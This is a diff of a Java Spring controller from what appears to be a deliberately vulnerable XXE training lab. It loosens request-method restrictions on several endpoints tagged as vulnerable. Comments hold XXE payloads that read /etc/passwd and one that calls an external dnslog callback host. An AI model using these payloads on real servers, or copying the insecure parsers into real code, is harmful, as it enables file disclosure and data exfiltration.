@@ -1,10 +1,9 @@
 package com.best.hello.controller.XXE;
 
-import org.jdom2.input.SAXBuilder;
 import org.dom4j.io.SAXReader;
+import org.jdom2.input.SAXBuilder;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.RestController;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
@@ -14,13 +13,14 @@ import org.xml.sax.XMLReader;
 import org.xml.sax.helpers.XMLReaderFactory;
 import org.xmlbeam.annotation.XBRead;
 
+import javax.xml.XMLConstants;
 import javax.xml.bind.JAXBContext;
 import javax.xml.bind.Unmarshaller;
 import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
 import javax.xml.stream.XMLInputFactory;
 import javax.xml.stream.XMLStreamReader;
-import java.io.*;
+import java.io.StringReader;
 
 
 @RestController
@@ -33,7 +33,7 @@ public class XXE {
      * Content-Type: application/xml
      * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://0g5zvd.dnslog.cn">]><root>&xxe;</root>
      */
-    @RequestMapping(value = "/XMLReader", method = RequestMethod.POST)
+    @RequestMapping(value = "/XMLReader")
     public String XMLReader(@RequestBody String content) {
         try {
             System.out.println(content);
@@ -51,7 +51,7 @@ public class XXE {
     /**
      * @vul xmlbeam
      */
-    @RequestMapping(value = "/xmlbeam", method = RequestMethod.POST)
+    @RequestMapping(value = "/xmlbeam")
     public String handleCustomer(@RequestBody Customer customer) {
         System.out.println(customer);
         return String.format("%s:%s login success!", customer.getFirstname(), customer.getLastname());
@@ -70,7 +70,7 @@ public class XXE {
     /**
      * @vul SAXReader
      */
-    @RequestMapping(value = "/SAXReader", method = RequestMethod.POST)
+    @RequestMapping(value = "/SAXReader")
     public String SAXReader(@RequestBody String content) {
         try {
             SAXReader sax = new SAXReader();
@@ -87,7 +87,7 @@ public class XXE {
     /**
      * @vul SAXBuilder，是一个JDOM解析器，能将路径中的XML文件解析为Document对象
      */
-    @RequestMapping(value = "/SAXBuilder", method = RequestMethod.POST)
+    @RequestMapping(value = "/SAXBuilder")
     public String SAXBuilder(@RequestBody String content) {
         try {
             SAXBuilder saxbuilder = new SAXBuilder();
@@ -102,10 +102,10 @@ public class XXE {
 
     /**
      * @vul DocumentBuilder类 有回显
-     * @poc http://god.com:8888/XXE/DocumentBuilder
+     * @poc http://127.0.0.1:8888/XXE/DocumentBuilder
      * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><person><name>&xxe;</name></person>
      */
-    @RequestMapping(value = "/DocumentBuilder", method = RequestMethod.POST)
+    @RequestMapping(value = "/DocumentBuilder")
     public String DocumentBuilder(@RequestBody String content) {
         try {
             // DocumentBuilderFactory是用于创建DOM模式的解析器对象,newInstance方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。
@@ -132,7 +132,7 @@ public class XXE {
      * @poc http://127.0.0.1:8888/XXE/unmarshaller (POST)
      * payload <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/passwd">]><student><name>&out;</name></student>
      */
-    @RequestMapping(value = "/unmarshaller", method = RequestMethod.POST)
+    @RequestMapping(value = "/unmarshaller")
     public String Unmarshaller(@RequestBody String content) {
         try {
 
